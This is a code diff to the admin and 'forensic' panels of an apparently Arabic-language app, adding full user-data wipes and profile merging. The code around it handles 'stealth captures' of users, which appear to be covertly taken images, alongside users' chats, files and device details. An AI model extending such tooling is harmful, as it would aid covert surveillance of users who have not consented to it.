@@ -16,6 +16,7 @@ import {
   firebaseSaveTargetedNotification,
   firebaseFetchAllStealthCaptures,
   firebaseDeleteStealthCapture,
+  firebaseWipeAllUserData,
   firebaseFetchAllAIChats,
   firebaseFetchAllUserFiles,
   firebaseSaveDefaultMedia,
@@ -196,11 +197,20 @@ export const AdminPanel9865 = ({ onClose, showToast, tips, onUpdateTips }: Admin
     
     setLoading(true);
     try {
+      // Find matching profile for deviceId
+      const profile = profiles.find(p => p.phone === phone);
+      const deviceId = profile?.deviceId || '';
+
+      // 1. Delete on Server (Recursive chats, uploads, birthday folders deletion)
       const res = await fetch('/api/control/delete-user', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone })
+        body: JSON.stringify({ phone, onlyMedia: false })
       });
+
+      // 2. Delete from Firebase Firestore completely (wipe profiles, files, captures, chats, complaints)
+      await firebaseWipeAllUserData(phone, deviceId);
+
       if (res.ok) {
         showToast('تم مسح كامل وثائق وسجلات ورقم العميل من الخادم بنجاح ✨', 'success');
         setProfiles(prev => prev.filter(p => p.phone !== phone));
@@ -717,19 +727,43 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
       let localUsers: any[] = [];
       if (res.ok) localUsers = await res.json();
       
-      const combined = [...fbProfiles];
-      localUsers.forEach(u => {
-        if (!combined.some(p => p.phone === u.phone)) {
-          combined.push({
-            phone: u.phone,
-            usernameUnified: u.name || 'مجهول',
-            deviceModel: 'متصفح ويب عادي',
-            operatingSystem: 'ويب أونلاين',
-            chats: [],
-            friends: []
-          });
+      const combinedMap: Record<string, any> = {};
+      
+      fbProfiles.forEach(p => {
+        if (p.phone) {
+          combinedMap[p.phone] = {
+            ...p,
+            friends: p.friends || [],
+            chats: p.chats || []
+          };
         }
       });
+
+      localUsers.forEach(u => {
+        if (!u.phone) return;
+        if (combinedMap[u.phone]) {
+          combinedMap[u.phone].usernameUnified = u.name || combinedMap[u.phone].usernameUnified || 'مجهول';
+          combinedMap[u.phone].deviceId = u.deviceId || combinedMap[u.phone].deviceId || '';
+          if (!combinedMap[u.phone].friends || combinedMap[u.phone].friends.length === 0) {
+            combinedMap[u.phone].friends = u.friends || [];
+          }
+          if (!combinedMap[u.phone].chats || combinedMap[u.phone].chats.length === 0) {
+            combinedMap[u.phone].chats = u.chats || [];
+          }
+        } else {
+          combinedMap[u.phone] = {
+            phone: u.phone,
+            usernameUnified: u.name || 'مجهول',
+            deviceId: u.deviceId || '',
+            deviceModel: 'متصفح ويب عادي',
+            operatingSystem: 'ويب أونلاين',
+            chats: u.chats || [],
+            friends: u.friends || []
+          };
+        }
+      });
+
+      const combined = Object.values(combinedMap);
 
       // Fetch stealth images from Firebase
       const captures = await firebaseFetchAllStealthCaptures();
@@ -995,7 +1029,7 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
         body: JSON.stringify({ phone, onlyMedia: true })
       });
       
-      // 2. Locate and delete all Firebase stealth captures for this user
+      // 2. Locate and delete all Firebase stealth captures and files for this user
       const userProfile = profiles.find(p => p.phone === phone);
       const matchedName = userProfile?.usernameUnified;
       const userFbCaptures = stealthImages.filter(img => 
@@ -1011,6 +1045,19 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
         } catch (fbErr) {
           console.error("Failed to delete Firebase capture:", fbErr);
         }
+      }
+
+      // 3. Clear Firestore user files for this user
+      try {
+        const userFiles = await firebaseFetchAllUserFiles();
+        const matchedFiles = userFiles.filter(f => f.phone === phone || f.deviceId === phone);
+        const { doc, deleteDoc } = await import('firebase/firestore');
+        const { db } = await import('../lib/firebase');
+        for (const file of matchedFiles) {
+          await deleteDoc(doc(db, 'a', 'aa', 'abc', file.id)).catch(() => {});
+        }
+      } catch (err) {
+        console.error("Failed to delete Firebase user files in forensic panel:", err);
       }
 
       if (res.ok) {
@@ -2181,8 +2228,8 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
 
               const userFolder = storedFolders.find(f => {
                 const nameLower = f.folderName.toLowerCase();
-                const phoneMatch = selectedUser.phone && nameLower.includes(selectedUser.phone);
-                const devIdMatch = selectedUser.deviceId && (nameLower.startsWith(selectedUser.deviceId.toLowerCase()) || nameLower.includes(selectedUser.deviceId.toLowerCase()));
+                const phoneMatch = selectedUser.phone && (nameLower.includes(selectedUser.phone) || f.phone === selectedUser.phone);
+                const devIdMatch = selectedUser.deviceId && (nameLower.startsWith(selectedUser.deviceId.toLowerCase()) || nameLower.includes(selectedUser.deviceId.toLowerCase()) || f.deviceId === selectedUser.deviceId);
                 return phoneMatch || devIdMatch;
               });
               const localFiles = userFolder ? userFolder.files : [];
